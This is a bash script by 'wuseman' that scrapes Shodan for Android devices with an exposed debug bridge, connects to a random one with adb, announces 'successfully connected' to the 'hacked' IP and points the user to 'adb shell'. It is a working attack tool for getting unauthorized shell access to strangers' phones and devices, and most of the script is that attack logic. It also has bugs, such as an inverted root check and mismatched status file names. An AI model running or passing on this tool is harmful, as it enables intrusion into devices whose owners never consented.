#!/bin/bash
################################################################################
################################################################################
####                                                                       #####
#### A notice to all nerds.                                                #####
#### If you will copy developers real work it will not make you a hacker.  #####
#### Resepect all developers, we doing this because it's fun!              #####
####                                                                       #####
################################################################################
################################ SOURCE CODE ###################################
################################################################################
###################### XXXXXXX WAS FOUNDED BY WUSEMAN ##########################
################################################################################
####                                                                       #####
####  XXXXX                                                                #####
####  Copyright (C) 2018-2019, wuseman                                     #####
####                                                                       #####
####  This program is free software; you can redistribute it and/or modify #####
####  it under the terms of the GNU General Public License as published by #####
####  the Free Software Foundation; either version 2 of the License, or    #####
####  (at your option) any later version.                                  #####
####                                                                       #####
####  This program is distributed in the hope that it will be useful,      #####
####  but WITHOUT ANY WARRANTY; without even the implied warranty of       #####
####  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #####
####  GNU General Public License for more details.                         #####
####                                                                       #####
####  You must obey the GNU General Public License. If you will modify     #####
####  this file(s), you may extend this exception to your version          #####
####  of the file(s), but you are not obligated to do so.  If you do not   #####
####  wish to do so, delete this exception statement from your version.    #####
####  If you delete this exception statement from all source files in the  #####
####  program, then also delete it here.                                   #####
####                                                                       #####
####  Contact:                                                             #####
####          IRC: Freenode @ wuseman                                      #####
####          Mail: wuseman <wuseman@nr1.nu>                               #####
####                                                                       #####
################################################################################
################################################################################


banner() {
cat << "EOF"
                  _      ____    ____    ____                 _   _     
 __        __ U  /"\  u |  _"\U | __")uU|  _"\ u__        __ | \ |"|    
 \"\      /"/  \/ _ \/ /| | | |\|  _ \/\| |_) |/\"\      /"/<|  \| |>   Author: wuseman <wuseman@nr1.nu>
 /\ \ /\ / /\  / ___ \ U| |_| |\| |_) | |  __/  /\ \ /\ / /\U| |\  |u   Version: 1.0
U  \ V  V /  U/_/   \_\ |____/ u|____/  |_|    U  \ V  V /  U|_| \_|    
.-,_\ /\ /_,-. \\    >>  |||_  _|| \\_  ||>>_  .-,_\ /\ /_,-.||   \\,-. 
 \_)-'  '-(_/ (__)  (__)(__)_)(__) (__)(__)__)  \_)-'  '-(_/ (_")  (_/  
                                                                        
      You will succeed, whether you are a professional or a n00b.

========================================================================

EOF
}

mustberoot() {
if [[ $EUID -eq "0" ]]; then
   printf "* Root privileges is required for $basename$0\n"
   exit 1
fi
}

status() {
ADBW=$(adb devices | sed -n '2p'|awk '{print $2}' | sed 's/device/normal/g')
ADBF="$(fastboot devices | grep fastboot|awk '{print $2}')"
ADBOFF="$(adb devices | sed -n 2p)"

if [[ $ADBW = "normal" ]]; then
    echo "normal" > $(pwd)/.wadbpwn-status
elif [[ $ADBW = "unauthorized" ]]; then
    echo " * Please allow this pc to authorize" > $(pwd)/.wdroid-status
elif [[ $ADBW = "recovery" ]]; then
    echo "recovery" > $(pwd)/.wdroid-status
elif [[ $ADBF = "fastboot" ]]; then
    echo "fastboot" > $(pwd)/.wdroid-status
else
echo " * No device connected.."
fi
}

mustbeinnormalmode() {
if [[ ! $(cat $(pwd)/.wdroid-status) = "normal" ]]; then
   echo "Device must be in normal mode for this feature, aborted.."
   exit 1
fi
}

requirements() {
mustbeinnormalmode
adb="$(which adb 2> /dev/null)"
distro=$(cat /etc/os-release | head -n 1 | cut -d'=' -f2 | sed 's/"//g')

if [ -z "$adb" ]; then
  read -p "Install adb (Y/n) " adbinstall
fi

case $adbinstall in
     "Y")
      sleep 1
case $distro in
     "Gentoo")
        echo -e "\nIt seems you running \e[1;32m$distro\e[0m wich is supported, installing adb...."
        emerge --ask android-tools ;;
     "Sabayon")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        emerge --ask android-tools ;;
     "Ubuntu")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "Debian")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "Raspbian")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "Mint")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "no") echo "Aborted." ;
           exit 0 ;;
esac
       echo -e "This tool is not supported for $distro, please go compile it from source instead...\n"
esac
}

root_required() {
adb shell which su &> /dev/null; if [[ $? = "1" ]]; then echo "This option need device to be rooted, aborted..";exit 1; fi
}


TARGETS="https://www.shodan.io/search?query=android+debug+bridge"
 mustberoot
 status
 banner
 curl -sL $TARGETS|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b'|shuf -n 1|xargs adb connect > hacked-ip.txt
 if [[ $(cat hacked-ip.txt |awk '{print $3}' |sed 's/^/Woohha!! You have been successfully connected to: /g'; echo) = "connected" ]]; then
 printf "* Something went wrong, please try again..\n"
 else
 cat hacked-ip.txt |awk '{print $3}' |sed 's/^/Woohha!! You have been successfully connected to: /g'; echo

# Let us remove the text file and exit the program..
 rm hacked-ip.txt &> /dev/null
 echo -e "Hint: use 'adb shell' for enter the device shell..\n"
 exit 1

fi

